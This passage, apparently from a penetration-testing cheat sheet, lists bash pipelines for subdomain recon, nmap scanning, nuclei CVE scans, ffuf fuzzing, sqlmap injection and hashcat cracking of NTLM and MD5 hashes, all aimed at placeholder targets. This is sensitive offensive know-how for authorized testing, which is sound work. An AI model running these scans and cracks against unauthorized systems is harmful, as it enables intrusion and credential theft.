# Docker Bench Security - CIS benchmark for Docker
docker-bench-security

# Falco - runtime container security monitoring
falco -f /etc/falco/falco_rules.local.yaml
```

### Reconnaissance Automation Pipeline

```bash
# Full recon automation with multiple tools
domain="target.com"
subfinder -d $domain -silent | httprobe -c 50 | tee /tmp/probed_urls.txt
cat /tmp/probed_urls.txt | nuclei -t cves/ -severity critical,high -o /tmp/nuclei_results.txt
cat /tmp/probed_urls.txt | whatweb -a 3 | tee /tmp/whatweb_results.txt
```

### Password Cracking Automation

```bash
# Hashcat mode reference and batch cracking
# Mode 0=MD5, 1000=NTLM, 1800=sha512crypt, 3200=bcrypt
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 0 -a 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1800 -a 0 sha512_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Network Discovery Automation

```bash
# Comprehensive network discovery pipeline
nmap -sn 192.168.1.0/24 -oG - | awk '/Up$/{print $2}' | tee live_hosts.txt
nmap -sV -iL live_hosts.txt -oA network_scan
nuclei -iL live_hosts.txt -t cves/ -severity critical,high
```

### Web Application Testing Pipeline

```bash
# Full web application testing automation
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302 -o ffuf_results.json
sqlmap -u "http://target/page?id=1" --batch --dbs --level=3
nuclei -u http://target -t cves/ -t vulnerabilities/ -severity critical,high,medium
```
